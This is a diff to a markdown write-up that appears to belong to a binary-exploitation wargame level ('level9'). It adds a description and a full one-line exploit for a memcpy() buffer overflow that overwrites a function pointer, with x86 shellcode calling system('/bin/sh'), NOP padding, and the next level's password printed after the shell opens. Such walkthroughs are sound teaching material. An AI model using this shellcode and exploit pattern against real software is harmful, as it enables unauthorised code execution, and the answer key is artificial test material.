@@ -15,12 +15,19 @@
 
 ## Exploited vulnerability
 
-We will use a Buffer-Overflow attack on the `memcpy()` to make use of the 2nd function pointer pointer to execute a shellcode.
-Here is a visual representation :
-![Layout](Layout_Objects.png)
+* We will use a Buffer-Overflow attack on the `memcpy()` to make use of the 2nd function pointer pointer to execute a shellcode.
+
+* The shellcode we used is a call to `system("/bin/sh")`
+
+* Here is a visual representation memory layout : ![Layout](Layout_Objects.png)
 
 ## Resolution
 
-```
+```sh
 ./level9 `python -c "print('10a00408'.decode('hex') + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80' + '\x90' * 79 +  '0ca00408'.decode('hex'))"
+
+$ cd ..
+$ cd bonus0
+$ cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
